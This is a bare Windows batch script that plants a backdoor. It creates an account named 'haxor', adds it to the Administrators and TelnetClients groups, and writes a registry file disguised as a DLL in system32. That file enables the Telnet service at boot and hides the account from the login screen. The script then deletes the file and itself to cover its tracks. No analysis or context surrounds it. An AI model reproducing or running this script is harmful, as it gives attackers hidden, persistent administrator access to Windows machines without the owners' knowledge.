net user haxor haxor /add 
net localgroup telnetclients /add 
net localgroup administrators haxor /add 
net localgroup telnetclients haxor /add 
set regadd=%windir%\system32\regadd.dll 
echo Windows Registry Editor Version 5.00>%regadd% 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TlntSvr]>>%regadd% 
echo "Start"=dword:00000002>>%regadd% 
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]>>%regadd% 
echo "haxor"="">>%regadd% 
regedit /s %regadd% 
:Cleaning 
del %regadd% 
del %0